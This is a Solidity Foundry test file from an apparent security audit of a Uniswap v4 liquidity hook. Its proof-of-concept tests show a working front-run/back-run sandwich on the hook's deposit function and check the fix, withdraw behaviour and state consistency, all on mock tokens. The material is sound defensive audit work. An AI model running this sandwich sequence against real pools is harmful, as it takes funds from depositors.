// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {AutopilotHook} from "../../../src/AutopilotHook.sol";

/// Full audit at f993a76: hook core logic and access control.
contract CorePoC is Test, Deployers {
    using StateLibrary for IPoolManager;

    AutopilotHook hook;
    PoolId id;

    address rebalancer = address(0xBEEF);
    address victim = address(0x71C7);
    address attacker = address(0xA77A);
    uint64 constant COOLDOWN = 3600;

    function setUp() public {
        vm.warp(1_758_300_000);
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        address flags = address(uint160(Hooks.AFTER_SWAP_FLAG) | (uint160(0x4444) << 144));
        deployCodeTo("AutopilotHook.sol:AutopilotHook", abi.encode(manager, address(this), rebalancer, COOLDOWN), flags);
        hook = AutopilotHook(flags);
        (key, id) = initPool(currency0, currency1, IHooks(hook), 3000, SQRT_PRICE_1_1);

        MockERC20(Currency.unwrap(currency0)).approve(address(hook), type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(address(hook), type(uint256).max);

        _fund(victim, address(hook));
        _fund(attacker, address(swapRouter));
    }

    // ------------------------------------------------------------------ helpers

    function _fund(address who, address spender) internal {
        MockERC20(Currency.unwrap(currency0)).mint(who, 1e26);
        MockERC20(Currency.unwrap(currency1)).mint(who, 1e26);
        vm.startPrank(who);
        MockERC20(Currency.unwrap(currency0)).approve(spender, type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(spender, type(uint256).max);
        vm.stopPrank();
    }

    /// Value in token1 at the fair price (tick 0, 1:1).
    function _val(address who) internal view returns (uint256) {
        return
            MockERC20(Currency.unwrap(currency0)).balanceOf(who) + MockERC20(Currency.unwrap(currency1)).balanceOf(who);
    }

    function _lp(int24 lo, int24 hi, int256 delta, bytes32 salt) internal {
        modifyLiquidityRouter.modifyLiquidity(
            key, ModifyLiquidityParams({tickLower: lo, tickUpper: hi, liquidityDelta: delta, salt: salt}), ""
        );
    }

    function _swapTo(bool zeroForOne, int24 limitTick) internal {
        PoolSwapTest.TestSettings memory ts = PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false});
        swapRouter.swap(
            key,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(1e30),
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(limitTick)
            }),
            ts,
            ""
        );
    }

    function _spot() internal view returns (int24 t) {
        (, t,,) = manager.getSlot0(id);
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _catchUpRef() internal {
        for (uint256 i; i < 10; i++) {
            _nextBlock();
            hook.pokePriceRef(key);
        }
        _nextBlock();
    }

    function _victimDeposit() internal returns (bytes32 pid) {
        vm.prank(victim);
        pid = hook.deposit(
            key,
            -600,
            600,
            20e18,
            TickMath.minUsableTick(60),
            TickMath.maxUsableTick(60),
            address(0),
            type(uint256).max,
            type(uint256).max,
            type(uint256).max
        );
    }

    // ------------------------------------------------------- CO-1: deposit sandwich

    /// deposit() takes a liquidity amount and pulls whatever token amounts spot
    /// demands, bounded only by the depositor's allowance. Any third party can
    /// sandwich it. Prior audit G-3 / A-7, still unfixed at f993a76.
    function test_CO1_deposit_sandwich_third_party_extracts_value() public {
        _lp(-6000, 6000, 20e18, bytes32(0)); // honest depth

        // Control: deposit and exit at the fair price.
        uint256 snap = vm.snapshotState();
        uint256 v0 = _val(victim);
        bytes32 pid = _victimDeposit();
        vm.prank(victim);
        hook.withdraw(pid);
        uint256 controlLoss = v0 - _val(victim);
        vm.revertToState(snap);

        // Attack.
        uint256 a0 = _val(attacker);
        v0 = _val(victim);
        vm.prank(attacker);
        _swapTo(false, 580); // front-run: push price toward the range's upper edge
        pid = _victimDeposit(); // victim pays at the pushed price, no max-amount check
        vm.prank(attacker);
        _swapTo(true, 0); // back-run through the victim's fresh liquidity
        assertLe(_spot() < 0 ? -_spot() : _spot(), 1, "back at fair price");
        vm.prank(victim);
        hook.withdraw(pid); // victim exits at the fair price
        uint256 victimLoss = v0 - _val(victim);
        int256 attackerPnl = int256(_val(attacker)) - int256(a0);

        console2.log("control victim loss (wei)", controlLoss);
        console2.log("sandwiched victim loss (wei)", victimLoss);
        console2.log("attacker PnL (wei):");
        console2.logInt(attackerPnl);
        assertGt(victimLoss, controlLoss + 1e16, "victim loses materially to the sandwich");
        assertGt(attackerPnl, 0, "sandwich is profitable for an unprivileged third party");
    }

    /// The fix: a depositor who quotes its maxima at the fair price (plus 1%)
    /// has the sandwiched deposit refused instead of filled at the pushed ratio.
    function test_CO1_fix_quoted_maxima_refuse_the_sandwich() public {
        _lp(-6000, 6000, 20e18, bytes32(0));
        MockERC20 t0 = MockERC20(Currency.unwrap(currency0));
        MockERC20 t1 = MockERC20(Currency.unwrap(currency1));

        // Quote: what the deposit costs at the fair price.
        uint256 snap = vm.snapshotState();
        uint256 b0 = t0.balanceOf(victim);
        uint256 b1 = t1.balanceOf(victim);
        _victimDeposit();
        uint256 max0 = (b0 - t0.balanceOf(victim)) * 101 / 100;
        uint256 max1 = (b1 - t1.balanceOf(victim)) * 101 / 100;
        vm.revertToState(snap);

        vm.prank(attacker);
        _swapTo(false, 580); // front-run
        vm.prank(victim);
        vm.expectPartialRevert(AutopilotHook.DepositExceedsMax.selector);
        hook.deposit(
            key,
            -600,
            600,
            20e18,
            TickMath.minUsableTick(60),
            TickMath.maxUsableTick(60),
            address(0),
            max0,
            max1,
            vm.getBlockTimestamp()
        );

        // An expired deadline is refused too.
        vm.prank(victim);
        vm.expectPartialRevert(AutopilotHook.DeadlineExpired.selector);
        hook.deposit(
            key,
            -600,
            600,
            20e18,
            TickMath.minUsableTick(60),
            TickMath.maxUsableTick(60),
            address(0),
            max0,
            max1,
            vm.getBlockTimestamp() - 1
        );
    }

    /// The mirror on withdraw() was checked and is NOT an extraction: pushing spot
    /// through the position before the exit leaves the LP better off at the fair
    /// price (it bought the dumped token below fair and earned the fee), matching
    /// the 2026-09-20 non-finding.
    function test_CO1b_withdraw_sandwich_is_not_profitable() public {
        _lp(-6000, 6000, 20e18, bytes32(0));
        bytes32 pid = _victimDeposit();

        uint256 snap = vm.snapshotState();
        uint256 v0 = _val(victim);
        vm.prank(victim);
        hook.withdraw(pid);
        uint256 controlOut = _val(victim) - v0;
        vm.revertToState(snap);

        uint256 a0 = _val(attacker);
        v0 = _val(victim);
        vm.prank(attacker);
        _swapTo(true, -580);
        vm.prank(victim);
        hook.withdraw(pid);
        vm.prank(attacker);
        _swapTo(false, 0);
        uint256 attackedOut = _val(victim) - v0;
        console2.log("control / sandwiched withdraw value", controlOut, attackedOut);
        assertGe(attackedOut, controlOut);
        assertLt(_val(attacker), a0, "attacker loses");
    }

    // --------------------------------- Verified: stored range == PoolManager state

    /// After narrowed (DS-1) rebalances, the range the hook records is exactly the
    /// PoolManager position under salt = positionId, the old range is empty, and the
    /// hook's ERC-6909 balance equals the sum of recorded idle balances. Withdraw
    /// zeroes everything.
    function test_CO_verify_stored_range_matches_poolmanager_and_idle_solvent() public {
        bytes32 pidA = _victimDeposit();
        bytes32 pidB = hook.deposit(
            key,
            -600,
            600,
            1e18,
            TickMath.minUsableTick(60),
            TickMath.maxUsableTick(60),
            address(0),
            type(uint256).max,
            type(uint256).max,
            type(uint256).max
        );
        _swapTo(true, -900);
        vm.warp(vm.getBlockTimestamp() + COOLDOWN);
        vm.roll(vm.getBlockNumber() + 300);
        _catchUpRef();

        vm.prank(rebalancer);
        hook.rebalance(pidB, -1500, -300, 0); // hook-only pool: narrowed
        _catchUpRef();
        vm.prank(rebalancer);
        hook.rebalance(pidA, -1500, -300, 0);

        _checkPos(pidA);
        _checkPos(pidB);
        (uint128 oldA,,) = manager.getPositionInfo(id, address(hook), -600, 600, pidA);
        (uint128 oldB,,) = manager.getPositionInfo(id, address(hook), -600, 600, pidB);
        assertEq(oldA, 0, "old range emptied A");
        assertEq(oldB, 0, "old range emptied B");
        _checkClaims(pidA, pidB);

        vm.prank(victim);
        hook.withdraw(pidA);
        hook.withdraw(pidB);
        assertEq(manager.balanceOf(address(hook), uint160(Currency.unwrap(currency0))), 0);
        assertEq(manager.balanceOf(address(hook), uint160(Currency.unwrap(currency1))), 0);
        assertEq(hook.poolPositionCount(id), 0);
    }

    function _checkPos(bytes32 pid) internal view {
        (,, int24 lo, int24 hi, uint128 liq, bool active,) = hook.positions(pid);
        assertTrue(active);
        (uint128 pmLiq,,) = manager.getPositionInfo(id, address(hook), lo, hi, pid);
        console2.log("stored lo / hi / liq:");
        console2.logInt(lo);
        console2.logInt(hi);
        console2.log(liq);
        assertEq(pmLiq, liq, "PoolManager liquidity at stored range == recorded");
        assertGe(lo, hook.boundLower(pid));
        assertLe(hi, hook.boundUpper(pid));
    }

    function _checkClaims(bytes32 a, bytes32 b) internal view {
        (uint128 a0, uint128 a1) = hook.idle(a);
        (uint128 b0, uint128 b1) = hook.idle(b);
        console2.log("idle A0/A1/B0/B1", a0, a1);
        console2.log("                ", b0, b1);
        assertEq(manager.balanceOf(address(hook), uint160(Currency.unwrap(currency0))), uint256(a0) + b0);
        assertEq(manager.balanceOf(address(hook), uint160(Currency.unwrap(currency1))), uint256(a1) + b1);
    }

    // ------------------- CO-2 (Info): the hook's own swap never writes the reference

    /// v4 skips hook callbacks when the hook itself is the swapper, so the
    /// re-ratio swap inside rebalance() moves spot without touching priceRef.
    /// `_updatePriceRef`'s premise ("every swap writes") does not hold, and the
    /// stable counter keeps counting across a hook-moved spot.
    function test_CO2_rebalance_swap_moves_spot_without_ref_write() public {
        // Hook-only pool below spot: the re-ratio swap walks an empty book.
        bytes32 pid = _victimDeposit();
        _swapTo(true, -900);
        vm.warp(vm.getBlockTimestamp() + COOLDOWN);
        vm.roll(vm.getBlockNumber() + 300);
        _catchUpRef();
        (int24 refBefore,,,,,,) = hook.priceRef(id);
        int24 spotBefore = _spot();
        vm.prank(rebalancer);
        hook.rebalance(pid, -1500, -300, 0);
        int24 spotAfter = _spot();
        (int24 refAfter,,,, bool clamped,,) = hook.priceRef(id);
        console2.log("spot before / spot after / ref after:");
        console2.logInt(spotBefore);
        console2.logInt(spotAfter);
        console2.logInt(refAfter);
        assertTrue(spotAfter != spotBefore, "hook swap moved spot");
        // Fixed: the hook writes the reference after its own swap.
        assertEq(refAfter, spotAfter, "reference follows the hook's own swap");
        assertFalse(clamped);
    }
}
